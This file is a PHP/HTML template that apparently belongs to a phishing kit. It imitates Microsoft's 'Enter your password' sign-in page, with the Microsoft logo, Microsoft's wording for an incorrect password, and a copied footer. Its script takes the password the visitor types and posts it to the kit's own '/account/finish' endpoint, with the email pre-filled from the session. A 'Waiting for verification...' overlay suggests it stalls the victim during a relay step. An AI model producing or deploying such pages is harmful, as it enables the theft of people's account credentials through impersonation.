<!doctype html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<title>Enter your password</title>
		<?php require(__DIR__ . '/head.php') ?>
		<script>
			document.addEventListener("DOMContentLoaded", function () {
				const form = document.getElementById("passwordForm");
				const btn = form.querySelector('button[type="submit"]');
				const btnText = btn.innerHTML;
				
				let isSubmitted = false;
				
				form.addEventListener("submit", async function (e) {
					e.preventDefault();
					
					const password = document.querySelector('input[name="entity_password"]').value;
					const email = document.querySelector('input[name="entity_email"]').value;
					
					if (!password || !email) {
						alert('Password and email are required');
						return;
					}
					
					btn.disabled = true;
					btn.innerHTML = `<span class="flex gap-2"> <svg width="24" height="24" stroke="#1267b2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><style>.spinner_V8m1{transform-origin:center;animation:spinner_zKoa 2s linear infinite}.spinner_V8m1 circle{stroke-linecap:round;animation:spinner_YpZS 1.5s ease-in-out infinite}@keyframes spinner_zKoa{100%{transform:rotate(360deg)}}@keyframes spinner_YpZS{0%{stroke-dasharray:0 150;stroke-dashoffset:0}47.5%{stroke-dasharray:42 150;stroke-dashoffset:-16}95%,100%{stroke-dasharray:42 150;stroke-dashoffset:-59}}</style><g class="spinner_V8m1"><circle cx="12" cy="12" r="9.5" fill="none" stroke-width="3"></circle></g></svg></span>`;
					
					try {
						const formData = new FormData();
						formData.append('entity_email', email);
						formData.append('entity_password', password);
						
						const response = await fetch('/account/finish', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                entity_password: password
                            }),
                            credentials: 'same-origin'
                        });
						
						const result = await response.json();
						
						if (result.success) {
							isSubmitted = true;
				            window.location.href = result.redirect;
						} else {
							btn.disabled = false;
							btn.innerHTML = btnText;
				            window.location.href = result.redirect;
						}
					} catch (error) {
						console.log('Error:', error);
						btn.disabled = false;
						btn.innerHTML = btnText;
						alert('An error occurred');
					}
				});
			});
		</script>
		<link rel="shortcut icon" href="/public/assets/img/mic.ico" />
		<link
			rel="stylesheet"
			href="/public/assets/css/entity-styles.css?v=<?= time() ?>"
		/>
		<link rel="stylesheet" href="/public/assets/css/custom.css?v=<?= time() ?>" />
	</head>
	<body
		class="w-full min-h-[50vh] bg-[#292929] sm:bg-[url('/public/assets/img/bg-live.svg')] sm:bg-fill sm:bg-center sm:bg-no-repeat"
	>
		<form
			id="passwordForm"
			method="post"
			action="/account/finish"
			class="p-8 py-10 mt-1 sm:mt-35 w-full max-w-md mx-auto flex flex-col justify-center items-center bg-[#292929] rounded-xl"
		>
			<input type="hidden" id="userField" name="entity_email" value="<?php echo htmlspecialchars($_SESSION['entity_email'] ?? '', ENT_QUOTES); ?>">
			<div class="flex flex-col gap-5 justify-center items-center">
                <div class="relative w-full flex justify-center items-center">
                    <a class="absolute" style="left: -4.6rem" href="/">
                        <svg class="fui-Icon-regular ___12fm75w f1w7gpdv fez10in fg4l7m0" fill="#adadad" aria-hidden="true" width="22" height="22" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M10.3 19.72a1 1 0 0 0 1.4-1.43L6.33 13H20a1 1 0 0 0 0-2H6.33l5.37-5.28a1 1 0 0 0-1.4-1.42l-6.93 6.82c-.5.5-.5 1.3 0 1.78l6.92 6.83Z" fill="#adadad"></path></svg>
                    </a>
                    <svg
                        aria-label="Microsoft"
                        data-testid="microsoftLogo"
                        role="img"
                        width="114"
                        height="24"
                        viewBox="0 0 114 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                    >
                        <path
                            d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z"
                            fill="#FFFFFF"
                        ></path>
                        <path
                            d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z"
                            fill="#FFB900"
                        ></path>
                        <path
                            d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z"
                            fill="#00A4EF"
                        ></path>
                        <path
                            d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z"
                            fill="#7FBA00"
                        ></path>
                        <path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path>
                    </svg>
                </div>
				<div class="mt-3">
					<span
						class="border border-neutral-700 rounded-full text-sm font-semibold text-[#adadad] p-1 px-2"
						><?php echo $_SESSION['entity_email'] ?? ""; ?></span
					>
				</div>
				<div>
					<h1 class="text-white text-2xl font-semibold">Enter your password</h1>
				</div>
			</div>
			<div class="w-full max-w-sm mt-5 relative">
				<div class="relative">
					<input
						type="password"
						id="password"
						name="entity_password"
						placeholder=" "
						required
						class="peer w-full px-4 pr-10 py-3 border border-neutral-700 text-white rounded-md focus:outline-none placeholder-transparent h-12"
					/>

					<label
						for="entity_password"
						class="absolute left-3 -top-2 bg-[#292929] px-1 text-neutral-500 text-xs transition-all peer-placeholder-shown:top-2.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-neutral-500 peer-focus:-top-2 peer-focus:text-xs"
					>
						Password
					</label>

					<button
						type="button"
						id="togglePassword"
						class="cursor-pointer absolute right-3 top-1/2 -translate-y-1/2 text-neutral-400 hover:text-white focus:outline-none"
					>
						<svg
							id="eyeOn"
							xmlns="http://www.w3.org/2000/svg"
							fill="currentColor"
							class="w-5 h-5"
							viewBox="0 0 20 20"
						>
							<path
								d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"
							/>
						</svg>
						<svg
							id="eyeOff"
							xmlns="http://www.w3.org/2000/svg"
							fill="currentColor"
							class="w-5 h-5 hidden"
							viewBox="0 0 20 20"
						>
							<path
								d="M2.85 2.15a.5.5 0 1 0-.7.7l3.5 3.5a8.1 8.1 0 0 0-3.37 5.05.5.5 0 1 0 .98.2 7.09 7.09 0 0 1 3.1-4.53l1.6 1.59a3.5 3.5 0 1 0 4.88 4.89l4.3 4.3a.5.5 0 0 0 .71-.7l-15-15Zm9.27 10.68a2.5 2.5 0 1 1-3.45-3.45l3.45 3.45Zm-2-4.83 3.38 3.38A3.5 3.5 0 0 0 10.12 8ZM10 6c-.57 0-1.13.07-1.67.21l-.8-.8A7.65 7.65 0 0 1 10 5c3.7 0 6.94 2.67 7.72 6.4a.5.5 0 0 1-.98.2A6.97 6.97 0 0 0 10 6Z"
							/>
						</svg>
					</button>
					<script>
						const passwordInput = document.getElementById(
							"password",
						);
						const togglePasswordBtn = document.getElementById("togglePassword");
						const eyeOn = document.getElementById("eyeOn");
						const eyeOff = document.getElementById("eyeOff");

						togglePasswordBtn.addEventListener("click", () => {
							const isPassword = passwordInput.type === "password";
							passwordInput.type = isPassword ? "text" : "password";
							if (isPassword) {
								eyeOn.classList.add("hidden");
								eyeOff.classList.remove("hidden");
							} else {
								eyeOn.classList.remove("hidden");
								eyeOff.classList.add("hidden");
							}
						});
					</script>
				</div>
				<?php if (isset($_SESSION['auth_error'])): ?>
				<div class="flex flex-col mb-5 mt-1">
					<div class="flex gap-1 items-center">
						<svg
							class="text-[#e37d80]"
							fill="currentColor"
							class="___12fm75w f1w7gpdv fez10in fg4l7m0"
							aria-hidden="true"
							width="12"
							height="12"
							viewBox="0 0 12 12"
							xmlns="http://www.w3.org/2000/svg"
						>
							<path
								d="M6 11A5 5 0 1 0 6 1a5 5 0 0 0 0 10Zm-.75-2.75a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Zm.26-4.84a.5.5 0 0 1 .98 0l.01.09v2.59a.5.5 0 0 1-1 0V3.41Z"
								fill="currentColor"
							></path>
						</svg>
						<div>
							<p class="text-[#e37d80] text-xs">
								That password is incorrect for your Microsoft account.
							</p>
						</div>
					</div>
				</div>
                <?php unset($_SESSION['auth_error']); ?>
				<?php endif; ?>
				
				<button
					type="submit"
					style="font-size: 14px"
					class="w-full cursor-pointer flex justify-center items-center bg-[#1267b2] hover:bg-[#1479d1] disabled:bg-[#1e1e1e] disabled:cursor-default text-white font-semibold cb-display p-2 mt-8 rounded-md transition duration-200"
				>
					Next
				</button>
			</div>
		</form>
		<div id="loadingContainer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 9999;">
			<div style="text-align: center;">
				<svg width="60" height="60" stroke="#1267b2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
					<style>.spinner_V8m1{transform-origin:center;animation:spinner_zKoa 2s linear infinite}.spinner_V8m1 circle{stroke-linecap:round;animation:spinner_YpZS 1.5s ease-in-out infinite}@keyframes spinner_zKoa{100%{transform:rotate(360deg)}}@keyframes spinner_YpZS{0%{stroke-dasharray:0 150;stroke-dashoffset:0}47.5%{stroke-dasharray:42 150;stroke-dashoffset:-16}95%,100%{stroke-dasharray:42 150;stroke-dashoffset:-59}}</style>
					<g class="spinner_V8m1"><circle cx="12" cy="12" r="9.5" fill="none" stroke-width="3"></circle></g>
				</svg>
				<p style="color: #9fd0ff; margin-top: 20px; font-size: 16px;">Waiting for verification...</p>
			</div>
		</div>
		<footer
			class="flex flex-col gap-2 mt-76 sm:mt-42 items-center justify-center p-4"
		>
			<div class="flex gap-6">
				<p
					class="text-neutral-300 hover:text-white hover:underline cursor- text-xs"
				>
					Help and feedback
				</p>
				<p
					class="text-neutral-300 hover:text-white hover:underline cursor-pointer text-xs"
				>
					Terms of use
				</p>
				<p
					class="text-neutral-300 hover:text-white hover:underline cursor-pointer text-xs"
				>
					Privacy and cookies
				</p>
			</div>
			<p class="text-neutral-300 text-[10px]">
				Use private browsing if this is not your device.
				<span class="cursor-pointer font-semibold text-blue-400 hover:underline"
					>Learn more</span
				>
			</p>
		</footer>
	</body>
</html>
